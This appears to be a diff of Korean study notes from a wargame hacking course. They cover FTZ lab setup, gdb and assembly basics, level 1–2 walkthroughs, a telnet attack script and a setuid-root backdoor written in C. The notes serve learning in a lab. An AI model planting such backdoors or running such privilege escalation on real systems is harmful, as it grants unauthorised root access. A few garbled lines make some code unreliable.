@@ -1,0 +1,4058 @@
+usb타입의 무선 랜카드 사기!
+
+====================================================서버설정=====================================================
+
+c언어를 -> 바이너리코드 -> 디스어셈블리어로 바뀜 -> 다시 역순으로 반복 -> 취약성분석 -> 공격툴 만들기
+
+hackme 다운로드 ( 워게임 사이트 )
+	■ HackMe 시스템(ftz.hackerschool.org mirror site)
+		● 워게임 레벨			: level1 ~ level20
+		● 레벨 암호 확인 방법 	: $ my-pass 
+		● root 사용자 암호		: qortmdcks(백승찬)  
+
+hackme 설정
+	dhcp -> ip 고정하기
+		# vi /etc/rc.local
+			맨 밑에 dhcpclient 주석처리 
+		# setup 
+			- IP address: 192.168.10.240 
+			- Netmask: 255.255.255.0
+			- Default gateway (IP): 192.168.10.2
+			- Primary nameserver: 168.126.63.1
+		# service network restart 
+		# ifconfig 
+		# netstat -nr
+		# cat /etc/resolv.conf
+		# nslookup www.daum.net
+
+칼리 32bit 설치 kali.org 에서 vmware용으로 다운받기 
+
+hackme를 위한 putty 설정 작업 
+	ip		: 192.168.10.240
+	포트	:  23번
+	접속형식	: telnet
+	왼쪽터미널 -> 키보드 -> 백스페이스키 -> control-H 로 바꾸기
+	왼쪽윈도우 -> Appearance -> Font settings -> Change -> 글씨크기 바꾸기 
+	왼쪽윈도우 -> Colours -> Use system colours 체크하면 흰색에 검은글씨로 바뀜 
+	왼쪽윈도우 -> Translation -> Remote character set -> Use font encoding 으로 바꾸기 -> 서버가 쓰고있는걸 putty가 끌어서 쓰는것을 말함
+	Sesstion -> Saved Sessions -> 19기_HackMe 쓰고 저장
+
+리눅스200설정
+	ip 20.200 -> 10.200 으로 바꾸기 
+		NAT네트워크 형식으로
+		# nmtui
+			-> 연결편집
+			-> eth0
+			-> edit connection
+				IPv4 설정: 수동
+				주소: 192.168.10.200/24
+				게이트웨이: 192.168.10.2
+				DNS 서버: 168.126.63.1
+				검색 도메인: example.com
+				quit
+		# nmcli connection up eth0 
+		# telnet 192.168.10.240 
+			level1 level1
+
+[참고] superputty 
+	기본 putty 는 기본탭을 여러개 설정 못함 이거는 가능함 
+	superputty 다운하기 -> 기본 putty 경로 설정 
+	이후 세션열기 탭형태로 여러개 띄우는거 가능 
+============================================================================================================================================================
+
+
+
+====================================================기초리버싱====================================================
+
+사이트 : http://inhack.org/wordpress/?cat=68
+		http://www.codeengn.com/
+목표 : 
+	1. 리버싱을 통한 의사 코드 생성
+		의사코드란? : c언어코드생성 ----컴파일----> a파일만들어짐(1010로 이루어짐) ---disassemble--> 어셈블리어생성 ------해석-----> c언어로만들기
+			이렇게 위와같이 처음의 c언어와 똑같이 되지 않아서 의사코드라고하는것임 
+	2. Exploit 코드 개발(BoF, FSB)
+
+1. 선수지식	
+	
+	1. 단원의 목적 
+		메모리 구조에 대한 이해
+		SetUID/SetGID/Sticky Bit 이해
+		gdb 기본사용법 
+	
+	2. 정보 확인
+		$ cd tmp
+		$ cat /etc/redhat-release		->	RedHat 9.X 
+		$ uname -a					->	Kernel 2.4.X
+		$ cd ~/tmp 
+		$ su 	qortmdcks
+		$ vi vimrc.sh 
+			#!/bin/bash
+			# 관리자만 스크립트를 실행할 수 있도록 함.
+			if [ `id -u` -ne 0 ] ; then
+			echo "Only root users are allowed."
+			exit 1
+			fi
+			
+			FILE1=.vimrc
+			
+			# /home/level1 ~ /home/level20/ 디렉토리의 .vimrc 파일을 새로 설정 함.
+			for i in `seq 1 20`
+			do
+			echo "[*] level${i} user environment changing."
+			cd /home/level${i}
+			if [ -f $FILE1 ] ; then
+			echo "set tabstop=4" > $FILE1
+			echo "[+] level${i} user environment changed."
+			echo
+			else
+			echo "[-] level${i} user environment not changed."
+			fi
+			done
+		$ chmod 700 vimrc.sh 
+		$ ./vimrc.sh 
+		$ exit 
+	
+	3. 메모리 레이아웃에 대한 예제 
+		$ cd ~/tmp
+		$ vi hello.c 
+			/* Header File */
+			#include <stdio.h>
+			#include <stdlib.h>
+
+			/* Global Variable */
+			int retVal = 0;
+			int outVal;
+
+			/* main function */
+			int main(void)
+			{
+				char string[] = "hello"; 
+				char *ptr;
+				static int output = 1;
+			
+				/* Dynamic heap memory allocation */
+				ptr = (char *)malloc(sizeof(string));
+			
+				printf("%s\n", string);
+			
+				return retVal;
+			}
+		
+		$ gcc -o hello hello.c  -> 위의 코드를 바이너리로 전환 -> 위의 #include 의 라이브러리와 바이너리를합쳐서 -> hello 나옴 
+		$ ldd /home/level1/hello	-> 하면 링크가 걸린게 보임 위에서 2개걸려서 2개걸린게 보임 
+		$ ./hello
+			메모리 구조 설명 
+				기본적으로 상위주소에는 커널과 프로그램이 실행되면 조그마하게 실행됨 
+				하위주소에는 운영체제가 뜨면서 로그인화면이 뜨는것까지 사용
+				예를들어 hello실해앟면
+				맨 밑에 text 그다음 data 그다음 heap이 있고 
+					텍스트에는 1010100으로 바뀐 코드가 들어가있음 안변함
+					데이터에는 데이터와 BSS가 있는데 
+						데이터에는 전역변수와 초기화된 변수가 들어가고
+						BSS는 초기화되지 않은 변수가 들어감 
+					힙은 동적메모리로 동적으로 할당된 데이터가 저장된다 
+				이렇게 순서대로 해놓은 이유는 변하지 않는 값은 맨 밑에 저장하고 변하는 값들은 위로올린다 
+					스택은 지역변수가 저장됨 (생성되고 삭제가 빈번하는 곳에서 사용하는것이 스택) (스택과 힙 사이에 여유공간이 있는데 이는 변수가 늘어갈 경우가 있기 때문에 이다)
+					
+	4. 인자가 전달되는 방법에 대한 예제 
+		$ vi structure.c 
+			#include<stdio.h>
+
+			void function(int a, int b, int c)
+			{
+				char buffer1[5];
+				char buffer2[10];
+			}
+
+			int main()
+			{
+				function(1,2,3);
+				return 0;
+			}
+		
+		$ gcc -o structure structure.c
+		$ ./structure
+		$ echo $?
+		
+	5. gdb를 통해 structure 프로그램을 disassembly 해보자.
+		
+		어셈블리 언어 =  기계어를 사람이 알아볼수 있도록 만든 일종의 매크로 모음
+			바이너리코드와 어셈블리언어는 1:1 매칭방식이다 
+				바이너리 -> 어셈블리어 =디스어셈블
+				어셈블리어 -> 바이너리 =어셈블
+				c언어 -> 바이너리언어 = 컴파일
+				바이너리언어 -> c언어 = 디컴파일 
+		
+		$ gdb structure
+			(gdb) disassemble main
+				-> 함수가 콜을 하기전에 3,2,1을 푸시해서 넣는데 
+					이유는 함수를 호출하기전에 인자를 스택에 넣어야 하기 때문이다 
+					이때 순서는 321순서로 넣어야 함수를 호출하게 되면 스택은 
+					후입선출이기때문에 123으로 나오게 된다.
+			(gdb) quit
+
+2.. Level1 -> Level2
+	1. 목적 : 백도어에 대한 이해 
+	2. 백도어에 대해
+		멀웨어 : 바이러스 백도어 스파이웨어 기타
+		백도어 : 사용자 인증 등 정상적인 절차를 거치지 않고 응용프로그램 또는 시스템에 접근할 수 있는 프로그램 
+			종류 :
+				로그인,텔넷,서비스,라이브러리,커널,파일시스템,부트블록,루트킷,tcp,udp,icmp,windowsNT 등등.
+	
+	[실습] Level1 문제에 도전하기 
+		putty로 Level1사용자로 접속!
+			hint는 힌트파일 tmp가 작업파일 
+		1$ cd
+		1$ ls -l
+		1$ cat hint 
+			level2 권한에 setuid가 걸린 파일을 찾는다.
+		1$ find / -user level2 -perm -4000 2>/dev/null 
+		1$ ls -l /bin/ExecuteMe			-> 백도어 프로그램이란것이 확인된다.
+		1$ /bin/ExecuteMe
+		2$ bash
+		2$ my-pass
+			id : level2 password : hacker or cracker
+		2$ exit
+		1$ telnet localhost
+			id : level2 password : hacker or cracker
+	
+	[실습] 리버싱을 통한 의사 코드 (가상코드) 복원 
+		프로그램 분석 방법
+			일반적 : 피해자 시스템에 공격자가 공격을해서 악성코드가 실행됐을때 피해자 시스템의 상태가 변경된다 (메모리,레지스트리 등등) 이때
+				정적분석 :  악성코드만 분석하면 정적분석
+				동적분석 :  코드뿐만이 아니라 모든것을 분석하는것이 동적분석
+			리버싱 : 공격자가 공격해서 악성코드가 실행됐을때 악성코드를 
+				정적분석 :  실행하지 않은 상태에서 덤프를 떠서 디스어셈블해서 분석한다. 
+					단점 :  실행했을때 나타나는 모습을 볼 수가 없다.
+				동적분석 :  실행하기 전에 브레이크 포인트를 걸어서 실행시켜 브레이크포인트에서 메모리상태를 본다.
+			블랙 박스 기법	 : 소스코드 없이 분석을 하는것을 말한다. 바이너리 코드만 가지고 분석
+			화이트 박스 기법 : 소스코드를 보면서 분석을 하는것을 말한다.
+			
+	어셈블리 언어 
+		1. 리버스 엔지니어링 : 이진코드로 되어 있는 실행 파일을 분석하려는 일련의 행위
+		2. 리버스 엔지니어링 종류
+			보안적 관점 
+				암호화 알고리즘과 관련된 보안의 평가 
+				바이러스 또는 악성코드 제작
+				백신을 제작하기 위해 
+			개발적 관점
+				소프트웨어 개발시에 필요한 지식을 습득하기 위해 사용
+		3. 법률적 제제 
+			바이너리 코드를 보면 불법 but 걸리기 쉽지 않음 
+		4. 리버싱 분석 방법의 종류 
+			정적 분석
+			동적 분석 
+		5. 리버싱 관련 프로그램 
+			바이너리 에디터 	-> 리눅스 : vi에서 %!xxd 쓰면 보임,	윈도우 : HxD
+			계산기				-> calc.exe
+			디스어셈블러		-> 이뮤니티 디버거, 올리디버그, 윈디버그
+				0과 1을 어셈블리로 변환
+			디버거 				-> 이뮤니티 디버거, 올리디버그, 윈디버그
+				user mode 일반 응용 프로그램
+					일반 응용프로그램을분석할때 사용하는 것임 
+					윈도우 : 올리디버그(가장많이사용), IDA프로(상용제품), 이뮤니티디버거(파이썬에 최적화되어있음)
+					리눅스 : gdb(TUI), kdbg(GUI gdb), edb-debugger(GUI)
+				kernel mode 하드웨어 관련 프로그램 
+					커널단에서 사용하는 것을 분석하는 것이다. 커널멀웨어인경우 이거를 사용해야 분석가능
+					윈도우 : windbg, softICE
+		6. 어셈블리어 
+			CPU구조 
+				연산장치 : 연산회로 집합
+					내부장치 : 가산기 보수기 시프터
+****)				관련 레지스터 : 누산기, 데이터 레지스터, 상태 레지스터 
+				
+				제어장치 : 입출력 기억 연산 장치 제어하고 감시 
+					내부장치 : 명령 해독기, 부호기, 주소해독기
+****)				관련 레지스터 : 프로그램카운터, 명령 레지스터, 메모리주소레지스터, 메모리버퍼레지스터 
+				
+				레지스터 : CPU내에 있는 임시적인 저장 장치 
+****)				범용 레지스터 : EAX, EBBX, ECX, EDX 
+						AX = AH(왼쪽 8비트상위) 와 AL(오른쪽8비트하위)로 구성된것 EAX는 이것을 확장해서 32bit로 만듬 AX는 16bit
+							
+					세그먼트레지스터 : CS, DS, SS ,(ES,FS,GS)
+					
+****)				포인터 레지스터 : EPB, ESP, EIP 
+					
+					인덱스레지스터 : EDI, ESI
+					
+					플래그레지스터 :EFLAGS
+						CF : 캐리플래그로 자리올림과 자리내림 발생할 때 1로 표시 
+						PF : 패리티 플래그 오류?????
+						ZF : 산술연산 결과 0이면1 이외에는 0으로 표시 (같은걸 판별할때 사용한다)
+			MEMORY 기본 구조 
+				스택			: 스택은 높은주소에서 낮은 주소로 데이터가 쌓임 힙보다 속도가 빠름 
+				힙				: 데이터를 읽고 쓰는데 많은 정보가 필요해서 스택보다 속도가 느림 영구적인 경우에는 힙쓰는게 좋음 
+				데이터세그먼트	: 초기화된 외부 변수나 static 변수 등이 저장되는 영역
+				BSS세그먼트		: 초기화 되지 않은 데이터 세그먼트
+				텍스트 세그먼트 : CPU에 의해 실행되는 머신 코드가 있는 영역
+				
+			어셈블리어의 구조 
+				윈도우 Intel  : 목적지 원본 순서
+					gdb> set disassembly-flavor intel
+				리눅스 AT&T : 원본 목적지 순서 
+					gdb> set disassembly-flavor att 
+
+			데이터 타입
+				바이트	 : 8
+				워드	 : 16
+				더블워드 : 32
+			
+			리틀엔디언 과 빅엔디언 
+				0X34F3 을 넣을때 
+				빅엔디언  : 34F3으로 넣음 -> 실시간적으로 운영체제가 바뀌면 이걸 사용해야 함 
+				리틀엔디언: F334으로 넣음 -> 속도가 더 빨라짐 -> 레지스터 사용 공간이 반으로 준다 
+			
+			주소 지정 방식 
+				실습하면서 하기 
+				
+			어셈블리어의 기본 명령 
+				산술 연산 명령 
+					ADD : ADD AL 4	= AL이 3이면 실행후 AL 7
+					SUB : SUB AL 4 	= AL이 7이면 실행후 AL 3
+					CMP : CMP AL 4	= AL이 4이면 실행후 AL 0
+				데이터 전송 명령
+					MOV : MOV AX [BP-8] = BP주소에 8빼진 주소에 있는 데이터 값을 AX에 대입 
+					PUSH : 스택에 데이터 삽입할 때 사용 
+					POP : 스택에 데이터 삭제할 때 사용
+					LEA : 
+						LOAD=메모리의 값을 레지스터에 올릴때 쓰는 단어 
+						SAVE는 레지스터값을 메모리값에 저장할때 쓰는 단어 
+						주소값을 레지스터로 가져옴 
+				논리 명령
+					AND	: 기본
+					OR	: 기본
+					NOT	: 기본
+					XOR	: 기본
+					TEST : 0이냐 아니냐 를 판단할 때 사용 AL이 0이면 ZF=1 아니면 ZF=0
+				제어 전송 명령
+					JUMP : JMP 100h 100번 주소로 간다 
+					JNC  : 캐리플래그가 0이면 점프 
+					JE/JZ: ZF=1이면 점프, 결과가 0이면 점프(결과가 0이면 ZF=1이기 때문에)
+					JNE  : ZF=0이면 점프
+					CALL : JMP처럼 함수 호출할 때 사용 = PUST EIP + JMP 
+					RET  : 함수에서 호출한 곳으로 돌아갈 때 사용 = POP EIP + JUMP 
+					LOOP : 반복 
+					INT  : 인터럽트 호출되면 서브루틴 실행 
+			
+			명령어 형식 
+				opcode operand1, operand2
+					오퍼랜드의 종류 : 레지스터, 메모리, 직접값
+						mov 레지스터, 레지스터	EX) mov  ebx,  eax
+						mov 레지스터, 메모리	EX) mov  eax,  Value  /* Value : 미리 선언된 메모리 변수명 */
+						mov 메모리, 레지스터	EX) mov  Value,eax
+						mov 직접값, 레지스터	EX) mov  100,  eax
+						mov 직접값, 메모리		EX) mov  100,  Value
+					오피코드의 종류 : 산술,데이터,논리,연산,제어,스트링,프로세스제어
+						add : 더하기
+						sub : 빼기
+						inc : +1 증가
+						dec : -1 감소 
+						cmp : 값 비교 두 값을 빼서 0 따라서 ZF=1 로 설정됨 
+				데이터 전송 명령 
+					종류 : 메모리, 범용레지스터, 세그먼트레지스터 
+						MOV  : 이동
+						PUSH : 스택에 데이터 넣음 리틀엔디언 방식으로
+						POP  : 불러온다 데이터를 
+						LEA  : MOV는 데이터를 이동하는것 LEA는 데이터가있는 주소값을 이동하는것 
+							LOAD : RAM -> 레지스터
+							SAVE : 레지스터 -> RAM 
+				논리 연산 명령 
+					종류 : 자리옮김, 논리합, 논리곱, 기호변환 
+						TEST : 1오퍼랜드와 2오퍼랜드를 AND하여 그 결과가 0이면 ZF=1로 설정 NULL 체크할 때 주로 사용 
+				제어 전송 명령
+					종류 : 점프, 조건점프, 루프, 호출, 리턴
+						JMP
+						JE
+						JNE
+						CALL
+						RET 
+			
+			[실습] C언어 -> 어셈블리어 
+				(핵미)
+					$ cd ~/tmp
+					$ vi sample.c
+						int function(int a, int b)
+						{
+						char buffer[10];
+						a = a + b;
+						return a;
+						}
+						
+						int main(void)
+						{
+						int c;
+						c = function(1,2);
+						return 0;
+						}
+					$ gcc -S -o sample.a sample.c
+					$ ls -l
+					$ file *
+					$ vi sample.a
+			
+			[실습] C 언어 파일을 컴파일하고 disassemble 하기
+				(핵미)
+					$ gcc -o sample sample.c
+					$ file sample*
+					$ gdb -q sample
+			
+			(정리)
+				sample.c (C 언어) --- gcc -S --> sample.a (어셈블리어)
+				sample.c (C 언어) --- gcc    --> sample   (바이너리) --- gdb --> disassemble (어셈블리어)
+			
+			[실습] 어셈블리어로 코드를 개발하는 것 같은 동작을 하지만 코드가 조금 다르다!
+				(핵미)
+					$ vi sample2.c
+						int main()
+						{
+						int a=1;
+						int b=2;
+						int c;
+						c = a + b;
+						printf("%d\n",c);
+						return 0;
+						}
+					$ vi sample3.c
+						int sum(int a, int b)
+						{
+    						int c;
+    						c = a + b;
+						}
+						int main()
+						{
+    						int a=1;
+    						int b=2;
+    						int c;
+    						c = sum(a,b);
+							printf("%d\n", c);
+						}
+
+		[실습] 리버싱을 통한 의사코드 복원 Level1
+			(핵미)
+				$ cd
+				$ gdb /bin/ExecuteMe
+					disassemble main 
+					-> 나온 내용을 복사해서 노트패드에서 분석 
+				$ vi ExecuteMe.c	-> 공격 코드 만들기 
+					헤더파일은 어셈블리어 함수를 보고 man <함수이름> 쓰면 헤더가 나옴 찾아서 적기 
+					이후 메인페이지를 구성한다 함수를 보고 push했을때 주소값을  x/s <주소> 넣으면 명령어가나오는데 그걸 system에 넣으면 됨 
+					이후 man페이지를 보면서 구성
+					
+					/* Header */
+					#include <stdlib.h>
+					#include <unistd.h>
+					#include <stdio.h>
+					#include <string.h>
+					#include <sys/types.h>
+					#include <unistd.h>
+					
+					/* Global */
+					
+					/* Function */
+					
+					/* Main Function */
+					main()
+					{
+    					char buffer[30];
+	   					system("/usr/bin/clear");
+    					chdir("/home/level2");
+    					printf("\n\n\n\t\t레벨2의 권한으로 당신이 원하는 명령어를\n");
+    					printf("\t\t한가지 실행시켜 드리겠습니다.\n");
+    					printf("\t\t(단, my-pass와 chmod는 제외)\n");
+						printf("\t\t\t어떤 명령을 실행시키겠습니까?\n");
+    					printf("\n\n\t\t[level2@ftz level2]$ ");
+    					fgets(buffer, 0x1e , stdin);
+    					if(strstr(buffer, "my-pass") != 0 )
+    					{
+           					printf("\n\tmy-pass 명령은 사용할 수 없습니다.\n\n");
+        					exit(0);
+    					}
+    					if(strstr(buffer, "chmod") != 0 )
+    					{
+           					printf("\n\t\tchmod 명령은 사용할 수 없습니다.\n\n");
+        					exit(0);
+    					}
+        					printf("\n\n");
+        					setreuid(3002,3002);
+        					system(buffer);
+					}
+					
+		[실습] 공격용 프로그램 제작 (Remote)	-> Level1 
+			(리눅스200)
+				# mkdir -p hackme
+				# cd hackme 
+				# telnet 192.168.10.240
+					level1	level1
+					$ echo $TERM
+					$ echo $LANG
+				# vi level1.sh 
+					#!/bin/bash
+					export TERM=xterm
+					export LANG=ko_KR.euckr
+					export LOG1=level1.log
+					
+					attack() {
+						sleep 2; echo 'level1'
+						sleep 1; echo 'hostname'
+						sleep 1; echo '/bin/ExecuteMe'
+						sleep 1; echo 'bash'
+						sleep 1; echo 'my-pass' 
+						sleep 1; echo 'exit'
+					}
+					
+					echo "[*] Level1 attaack started."
+					echo "[*] Please wait a minute."
+					attack | telnet -l level1 192.168.10.240 > $LOG1 2>&1
+					
+					echo ""
+					echo -n "[+]"
+					grep 'Level2 Password' $LOG1
+					echo ""
+					if [ $? -eq 0 ] ;then
+						echo "[+] OK "
+					else
+						echo "[-] Fail "
+					fi
+		
+		[실습] 추가적인 실습 : 어셈블리언어의 빠른 분석 
+			$ vi test1.c
+				main()
+				{
+				}
+			$ gcc -o test1 test1.c
+			$ gdb test1
+				dissassemble main
+					0x080482f4 <main+0>:    push   %ebp				-> ebp값을 넣어줌 sfp값이 생기고 프레임의 시작부분이란 말임 sfp밑에는 ret로 복귀주소가있음
+					0x080482f5 <main+1>:    mov    %esp,%ebp		-> ebp와 esp를 맞춤
+					0x080482f7 <main+3>:    sub    $0x8,%esp			-> esp에 8바이트만큼 빼서 공간을 만듬 지역변수가 없기 때문에 더미공간임
+					0x080482fa <main+6>:    and    $0xfffffff0,%esp		-> esp의 첫번째 주소를 0으로 맞춰줘서 0부터 시작하게 한다 
+					0x080482fd <main+9>:    mov    $0x0,%eax			-> eax에 0이 들어감 초기화를 시키는것이다 이는 가비지 데이터를 0으로 초기화하는것임 
+					0x08048302 <main+14>:   sub    %eax,%esp			-> 0을 esp에서 뺀다 따라서 0이다 
+					0x08048304 <main+16>:   leave				
+					0x08048305 <main+17>:   ret										
+					0x08048306 <main+18>:   nop
+					0x08048307 <main+19>:   nop
+			
+			$ vi test2.c
+				#include<stdio.h>
+				int main(void)
+				{
+				return 0;
+				}
+			$ gcc -o test2 test2.c
+			$ gdb test2
+				dissassemble main
+					0x080482f4 <main+0>:    push   %ebp
+					0x080482f5 <main+1>:    mov    %esp,%ebp
+					0x080482f7 <main+3>:    sub    $0x8,%esp
+					0x080482fa <main+6>:    and    $0xfffffff0,%esp
+					0x080482fd <main+9>:    mov    $0x0,%eax
+					0x08048302 <main+14>:   sub    %eax,%esp
+					0x08048304 <main+16>:   mov    $0x0,%eax			-> eax에 0을 넣어준것임 이것만 차이가 있음 
+					0x08048309 <main+21>:   leave
+					0x0804830a <main+22>:   ret
+					0x0804830b <main+23>:   nop
+			
+			$ vi test3.c
+				#include<stdio.h>
+				int main(void)
+				{
+    				int a=10;
+    				return 0;
+				}
+			$ gcc -o test3 test3.c
+			$ gdb test3	
+				dissassemble main
+					0x080482f4 <main+0>:    push   %ebp
+					0x080482f5 <main+1>:    mov    %esp,%ebp
+					0x080482f7 <main+3>:    sub    $0x8,%esp
+					0x080482fa <main+6>:    and    $0xfffffff0,%esp
+					0x080482fd <main+9>:    mov    $0x0,%eax
+					0x08048302 <main+14>:   sub    %eax,%esp					--+ (밑에 줄) 변수값 즉 a에 대한 이름은 없음 코드를 복원할때 변수이름은 아무거나 지정하면 됨 
+					0x08048304 <main+16>:   movl   $0xa,0xfffffffc(%ebp)		-> ebp에 있는 곳에서 4바이트 만큼 뺀 주소에다 10을 집어넣어라 int가 4바이트이기 때문에 
+					0x0804830b <main+23>:   mov    $0x0,%eax
+					0x08048310 <main+28>:   leave
+					0x08048311 <main+29>:   ret
+					0x08048312 <main+30>:   nop
+					0x08048313 <main+31>:   nop
+			
+			$ vi test4.c
+				#include<stdio.h>
+				int main(void)
+				{
+    				int a=10;
+    				printf("hello world\n");
+    				return 0;
+				}
+			$ gcc -o test4 test4.c
+			$ gdb test4	
+				dissassemble main
+					0x08048328 <main+0>:    push   %ebp
+					0x08048329 <main+1>:    mov    %esp,%ebp
+					0x0804832b <main+3>:    sub    $0x8,%esp
+					0x0804832e <main+6>:    and    $0xfffffff0,%esp
+					0x08048331 <main+9>:    mov    $0x0,%eax
+					0x08048336 <main+14>:   sub    %eax,%esp
+					0x08048338 <main+16>:   movl   $0xa,0xfffffffc(%ebp)
+					0x0804833f <main+23>:   sub    $0xc,%esp
+					0x08048342 <main+26>:   push   $0x8048404
+					0x08048347 <main+31>:   call   0x8048268 <printf>
+					0x0804834c <main+36>:   add    $0x10,%esp
+					0x0804834f <main+39>:   mov    $0x0,%eax
+					0x08048354 <main+44>:   leave
+					0x08048355 <main+45>:   ret
+					0x08048356 <main+46>:   nop
+					0x08048357 <main+47>:   nop
+			
+			$ vi test5.c
+				#include<stdio.h>
+				int main(void)
+				{
+    				int a=10;
+   				    printf("a : %d\n", a);
+    				return 0;
+				}
+			$ gcc -o test5 test5.c
+			$ gdb test5	
+				dissassemble main
+					0x08048328 <main+0>:    push   %ebp
+					0x08048329 <main+1>:    mov    %esp,%ebp
+					0x0804832b <main+3>:    sub    $0x8,%esp
+					0x0804832e <main+6>:    and    $0xfffffff0,%esp
+					0x08048331 <main+9>:    mov    $0x0,%eax
+					0x08048336 <main+14>:   sub    %eax,%esp
+					0x08048338 <main+16>:   movl   $0xa,0xfffffffc(%ebp)
+					0x0804833f <main+23>:   sub    $0x8,%esp
+					0x08048342 <main+26>:   pushl  0xfffffffc(%ebp)		-> 위에서 ,뒤에 있는 a가 들어가는것 10이들어감
+					0x08048345 <main+29>:   push   $0x8048408			-> a: %d\n 이 들어가는 것임
+					0x0804834a <main+34>:   call   0x8048268 <printf>	-> 출력문임 인자가 1개지만 앞에문1개와 뒤에 a가 들어가야하므로 푸시가 2개임 엄청 많을수도있음
+					0x0804834f <main+39>:   add    $0x10,%esp
+					0x08048352 <main+42>:   mov    $0x0,%eax
+					0x08048357 <main+47>:   leave
+					0x08048358 <main+48>:   ret
+					0x08048359 <main+49>:   nop
+					0x0804835a <main+50>:   nop
+					0x0804835b <main+51>:   nop
+
+			$ vi test6.c
+				#include<stdio.h>
+				int main(void)
+				{
+    				int a=10;
+    				printf("a : %d\n", a);
+    				if (a==10)
+    				{
+						printf("OK");
+    				}
+    				return 0;
+				}
+			$ gcc -o test6 test6.c
+			$ gdb test6	
+				dissassemble main
+					0x08048328 <main+0>:    push   %ebp
+					0x08048329 <main+1>:    mov    %esp,%ebp
+					0x0804832b <main+3>:    sub    $0x8,%esp
+					0x0804832e <main+6>:    and    $0xfffffff0,%esp
+					0x08048331 <main+9>:    mov    $0x0,%eax
+					0x08048336 <main+14>:   sub    %eax,%esp
+					0x08048338 <main+16>:   movl   $0xa,0xfffffffc(%ebp)
+					0x0804833f <main+23>:   sub    $0x8,%esp
+					0x08048342 <main+26>:   pushl  0xfffffffc(%ebp)
+					0x08048345 <main+29>:   push   $0x804841c
+					0x0804834a <main+34>:   call   0x8048268 <printf>
+					0x0804834f <main+39>:   add    $0x10,%esp
+					0x08048352 <main+42>:   cmpl   $0xa,0xfffffffc(%ebp)			-> 앞 뒤 값을 빼서 같으면 0이고 아니면 0이다 위의 if문의 a의변수와 그 위의 a의 변수값이 같은지 확인하는 부분 
+					0x08048356 <main+46>:   jne    0x8048368 <main+64>			-> jne는 ZF가 1이 아니면 점프를 뛰는것 cmpl과 jne가 if문이라는것을 알 수 있다!!
+					0x08048358 <main+48>:   sub    $0xc,%esp
+					0x0804835b <main+51>:   push   $0x8048424
+					0x08048360 <main+56>:   call   0x8048268 <printf>
+					0x08048365 <main+61>:   add    $0x10,%esp
+					0x08048368 <main+64>:   mov    $0x0,%eax
+					0x0804836d <main+69>:   leave
+					0x0804836e <main+70>:   ret
+			
+			$ vi test7.c
+				#include<stdio.h>
+				int main(void)
+				{
+    				int a=10;ㅎ
+    				printf("a : %d\n", a);
+					switch (a)
+					{
+       					case 8: a=1;    break;
+       					case 9: a=2;    break;
+       					case 10:a=3;   break;
+       					default :a=4;   break;
+   					}
+    				return 0;
+				}
+			$ gcc -o test7 test7.c
+			$ gdb test7	
+				dissassemble main
+					0x08048328 <main+0>:    push   %ebp
+					0x08048329 <main+1>:    mov    %esp,%ebp
+					0x0804832b <main+3>:    sub    $0x8,%esp
+					0x0804832e <main+6>:    and    $0xfffffff0,%esp
+					0x08048331 <main+9>:    mov    $0x0,%eax
+					0x08048336 <main+14>:   sub    %eax,%esp
+					0x08048338 <main+16>:   movl   $0xa,0xfffffffc(%ebp)
+					0x0804833f <main+23>:   sub    $0x8,%esp
+					0x08048342 <main+26>:   pushl  0xfffffffc(%ebp)
+					0x08048345 <main+29>:   push   $0x804844c
+					0x0804834a <main+34>:   call   0x8048268 <printf>
+					0x0804834f <main+39>:   add    $0x10,%esp
+					0x08048352 <main+42>:   mov    0xfffffffc(%ebp),%eax
+					0x08048355 <main+45>:   mov    %eax,0xfffffff8(%ebp)
+					0x08048358 <main+48>:   cmpl   $0x9,0xfffffff8(%ebp)======================
+					0x0804835c <main+52>:   je      mn,d <main+85>
+					0x0804835e <main+54>:   cmpl   $0x9,0xfffffff8(%ebp)
+					0x08048362 <main+58>:   jg     0x804836c <main+68>
+					0x08048364 <main+60>:   cmpl   $0x8,0xfffffff8(%ebp)
+					0x08048368 <main+64>:   je     0x8048374 <main+76>						swich문법 
+					0x0804836a <main+66>:   jmp    0x804838f <main+103>
+					0x0804836c <main+68>:   cmpl   $0xa,0xfffffff8(%ebp)
+					0x08048370 <main+72>:   je     0x8048386 <main+94>
+					0x08048372 <main+74>:   jmp    0x804838f <main+103>==================
+					0x08048374 <main+76>:   movl   $0x1,0xfffffffc(%ebp)
+					0x0804837b <main+83>:   jmp    0x8048396 <main+110>
+					0x0804837d <main+85>:   movl   $0x2,0xfffffffc(%ebp)
+					0x08048384 <main+92>:   jmp    0x8048396 <main+110>					값이 바뀌는 부분임
+					0x08048386 <main+94>:   movl   $0x3,0xfffffffc(%ebp)
+					0x0804838d <main+101>:  jmp    0x8048396 <main+110>
+					0x0804838f <main+103>:  movl   $0x4,0xfffffffc(%ebp)====================
+					0x08048396 <main+110>:  mov    $0x0,%eax
+					0x0804839b <main+115>:  leave
+					0x0804839c <main+116>:  ret
+					0x0804839d <main+117>:  nop
+					0x0804839e <main+118>:  nop
+					0x0804839f <main+119>:  nop
+
+3. Level2 -> Level3
+	목적 : 편집기 사용법 (편집기 백도어)
+	
+	[실습] level2 문제에 도전하기 
+		$ ls -l
+		$ cat hint
+		$ find / -user level3 -perm -4000 2>/dev/null
+		$ ls -l /usr/bin/editor
+		$ which vi
+		$ ls -l /bin/vi
+		$ ls -l /usr/bin/vim 
+		$ /usr/bin/editor
+			! id
+			! bash
+		$ my-pass
+			can you fly?
+		$ exit
+			q!
+		
+	[참고] EUID RUID
+		RUID 는 로그인한 USER가 누구인지에 따라 다름 who am i	명령어로 확인 
+		EUID 는 SU를 통해 현재 누구의 계정인지를 확인 id , whoami 명령어로확인
+	
+	[실습] backdoor 파일 생성에 대한 실습(setreuid() 사용)
+		setuid	-> EUID값을 변경하는 것 
+		setreuid	-> RUID와 EUID 값을 변경 -> 유닉스같은 경우에는 패스워드 변경할때 RUID를 점검하기때문에 위에있는 명령어를 사용하면 못한다 
+		
+		# ls -l /bin/bash
+		# cp /bin/bash /test
+		# cd /test
+		# ls -l
+		# /bin/bash
+		# ps 
+		# exit
+		# /test/bash
+		# ps
+		# exit
+		# ls -l /test/bash
+		# chmod 4755 /test/bash
+		# ls -l /test/bash
+		$ telnet localhost
+		$ /test/bash				-> bash는 백도어로 너무 많이 사용되서 이걸 금지해놨다 
+		$ id
+		$ ps
+		$ exit
+		# cd /test
+		# vi backdoor.c		-> 위에 bash에 suid가 걸려도 막히기 때문에 이 파일을 만들고 suid를 설정한다 
+			#include<stdlib.h>
+			#include<sys/types.h>
+			#include<unistd.h>
+			main()
+			{
+				setreuid(0,0);				-> 쉘을 건드려서 동작을 하게 하려면 이게 꼭 필요함 
+				system("/bin/bash");
